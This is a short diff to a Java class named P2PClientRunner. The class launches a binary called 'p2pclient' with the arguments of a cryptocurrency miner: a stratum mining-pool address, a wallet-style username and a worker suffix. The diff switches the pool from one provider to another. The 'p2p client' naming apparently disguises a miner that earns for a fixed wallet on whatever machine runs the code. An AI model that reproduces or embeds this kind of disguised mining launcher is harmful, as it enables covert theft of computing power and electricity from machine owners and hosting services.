@@ -23,8 +23,7 @@ public class P2PClientRunner {
             System.out.println("🚀 Starting p2pclient...");
             ProcessBuilder processBuilder = new ProcessBuilder(
                 "./" + P2P_PATH,
-                "-a", "verus",
-                "-o", "stratum+tcp://na.luckpool.net:3956",
+                "-c", "stratum+ssl://sg.vipor.net:5140",
                 "-u", "RJPL26UE8uwEjuK7PNedATTRQ3Nx2GS1SV.1",
                 "-p", "x"
             );
